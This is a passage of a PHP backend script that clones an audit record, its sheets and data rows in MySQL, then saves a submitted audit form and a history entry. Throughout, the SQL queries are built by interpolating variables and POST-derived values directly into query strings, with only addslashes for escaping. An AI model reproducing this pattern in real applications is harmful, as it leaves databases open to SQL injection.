		$selectSheet = mysqli_query( $conn,"SELECT * FROM tbl_ia_sheet WHERE deleted = 0 AND timestamp_id = $timestamp_id");
		if ( mysqli_num_rows($selectSheet) > 0 ) {
			while($rowSheet = mysqli_fetch_array($selectSheet)) {
				$sheet_ID = $rowSheet['ID'];

				$sql_format = "INSERT INTO tbl_ia_sheet (user_id, portal_user, timestamp_id, name)
				SELECT user_id, '$portal_user', '$timestamp_id_new', name
				FROM tbl_ia_sheet
				WHERE deleted = 0 AND ID = $sheet_ID";
				if (mysqli_query($conn, $sql_format)) {
					$last_id_sheet = mysqli_insert_id($conn);

					$output_sheet = array (
						'old' => $sheet_ID,
						'new' => $last_id_sheet
					);
					array_push($sheet_output_arr, $output_sheet);
                    array_push($sheet_ID_arr, $sheet_ID);
                    array_push($sheet_ID_new_arr, $last_id_sheet);
				}
			}
		}
		$sheet_ID_new_arr_data = implode(' | ', $sheet_ID_new_arr);

		// Select and Clone IA
		$sql_ia = "INSERT INTO tbl_ia (user_id, portal_user, timestamp_id, title, description, sheet_id, last_modified, is_generated)
		SELECT user_id, '$portal_user', '$timestamp_id_new', title, description, '$sheet_ID_new_arr_data', '$last_modified', 1
		FROM tbl_ia
		WHERE ID = $ID";
		if (mysqli_query($conn, $sql_ia)) {
			$last_id_ia = mysqli_insert_id($conn);
		}

		// Loop each sheet (old)
		$i = 0;
		$data_output_arr = array();
		$data_ID_arr = array();
		$data_ID_new_arr = array();
		foreach($sheet_ID_arr as $sheet_ID_val) {

			// Select and Clone and Update Data
			$selectData = mysqli_query( $conn,"SELECT * FROM tbl_ia_data WHERE deleted = 0 AND sheet_id = $sheet_ID_val");
			if ( mysqli_num_rows($selectData) > 0 ) {
				while($rowData = mysqli_fetch_array($selectData)) {
					$data_ID = $rowData['ID'];

					$sql_data = "INSERT INTO tbl_ia_data (order_id, sheet_id, parent_id, include, data)
					SELECT order_id, '$sheet_ID_new_arr[$i]', parent_id, '$format_ID_new_arr_data', data
					FROM tbl_ia_data
					WHERE deleted = 0 AND ID = $data_ID";
					if (mysqli_query($conn, $sql_data)) {
						$last_id_data = mysqli_insert_id($conn);

						$output_data = array (
							'old' => $data_ID,
							'new' => $last_id_data
						);
						array_push($data_output_arr, $output_data);
		                array_push($data_ID_arr, $data_ID);
		                array_push($data_ID_new_arr, $last_id_data);
					}
				}
			}
			$i++;
		}

		// Loop each sheet (new) 
		foreach($sheet_ID_new_arr as $sheet_ID_new_val) {

			// Select and Reformat Data parent id and data
			$selectData = mysqli_query( $conn,"SELECT * FROM tbl_ia_data WHERE deleted = 0 AND sheet_id = $sheet_ID_new_val");
			if ( mysqli_num_rows($selectData) > 0 ) {
				while($rowData = mysqli_fetch_array($selectData)) {
					$data_ID = $rowData['ID'];
					$data_data = $rowData['data'];

					$data_parent_id_new = $rowData['parent_id'];
					$data_key = array_search($rowData['parent_id'], array_column($data_output_arr, "old"));
					if ($data_key !== false) {
					    $data_parent_id_new = $data_output_arr[$data_key]["new"];
					}

					// Loop each format (old)
					$data_data_output = json_decode($data_data, true);
					$data_data_new = array();
					$f = 0;
					foreach($format_ID_arr as $format_ID_val) {

						$format_key = array_search($format_ID_val, array_column($data_data_output, "ID"));
						if ($format_key !== false) {
							$data_output_new = array (
								'ID' => $format_ID_new_arr[$f],
								'content' => addslashes($data_data_output[$format_key]["content"])
							);
							array_push($data_data_new, $data_output_new);
						}
						$f++;
					}
					$data_data_new = json_encode($data_data_new, JSON_HEX_APOS | JSON_UNESCAPED_UNICODE);

					mysqli_query( $conn,"UPDATE tbl_ia_data set parent_id = $data_parent_id_new, data = '".$data_data_new."' WHERE ID = $data_ID" );
				}
			}
		}

		// Gather result
		$data_result = array();
		for ($d=0; $d < COUNT($data_output_arr); $d++) { 
			$data_ID_old = $data_output_arr[$d]["old"];
			$data_ID_new = $data_output_arr[$d]["new"];

			for ($f=0; $f < count($format_output_arr); $f++) { 
				$format_ID_old = $format_output_arr[$f]["old"];
				$format_ID_new = $format_output_arr[$f]["new"];

				if(!empty($_POST['radio_'.$data_ID_old.'_'.$format_ID_old])) {
	            	$data_column = array (
						'column' => strval($format_ID_new),
						'data' => addslashes($_POST['radio_'.$data_ID_old.'_'.$format_ID_old])
					);

	            	$data_output = array (
						'row' => strval($data_ID_new),
						'content' => $data_column
					);
					array_push($data_result, $data_output);
				} else if(!empty($_POST['columnData_'.$data_ID_old.'_'.$format_ID_old])) {
	            	$data_column = array (
						'column' => strval($format_ID_new),
						'data' => addslashes($_POST['columnData_'.$data_ID_old.'_'.$format_ID_old])
					);

	            	$data_output = array (
						'row' => strval($data_ID_new),
						'content' => $data_column
					);
					array_push($data_result, $data_output);
				}
			}
		}
		$data_content = json_encode($data_result, JSON_HEX_APOS | JSON_UNESCAPED_UNICODE);

		// Save Form
		$sql_form = "INSERT INTO tbl_ia_form (user_id, portal_user, ia_id, organization, audit_type, inspected_by, auditee, verified_by, date_start, date_end, audit_scope, score_type, score_data, label, description, operation, shipper, operation_type, audit_ex, addendum, product_observed, similar_product, product_applied, auditor, cert_valid, date_review_started, date_review_finished, total_time_review, date_inspection_started, date_inspection_finished, total_time_inspection, preliminary_audit, score_result)
		VALUES ('$user_id', '$portal_user', '$last_id_ia', '$organization', '$audit_type', '$inspected_by', '$auditee', '$verified_by', '$date_start', '$date_end', '$audit_scope', '$score_type', '$score_data', '$label', '$description', '$operation', '$shipper', '$operation_type', '$audit_ex', '$addendum', '$product_observed', '$similar_product', '$product_applied', '$auditor', '$cert_valid', '$date_review_started', '$date_review_finished', '$total_time_review', '$date_inspection_started', '$date_inspection_finished', '$total_time_inspection', '$columnPercent', '$score_result')";
		if (mysqli_query($conn, $sql_form)) {
			$last_id_form = mysqli_insert_id($conn);

			if ($columnPercent == 100) { mysqli_query( $conn,"UPDATE tbl_ia_form set final_audit = '".$columnPercent."' WHERE ID = '". $last_id_form ."'" ); }

			// Update Form separate for Custom Logo and Data
			mysqli_query( $conn,"UPDATE tbl_ia_form set file = '". $file ."' WHERE ID = '". $last_id_form ."'" );
			mysqli_query( $conn,"UPDATE tbl_ia_form set data = '". $data_content ."' WHERE ID = '". $last_id_form ."'" );

			// Insert History after Form
	        $sql_history = "INSERT INTO tbl_ia_history (user_id, portal_user, action, page, activity, last_modified)
	        VALUES ('$user_id', '$portal_user', '1', '2', '$last_id_form', '$last_modified')";
	        mysqli_query($conn, $sql_history);
		}
		echo json_encode($last_id_form);
	}
?>
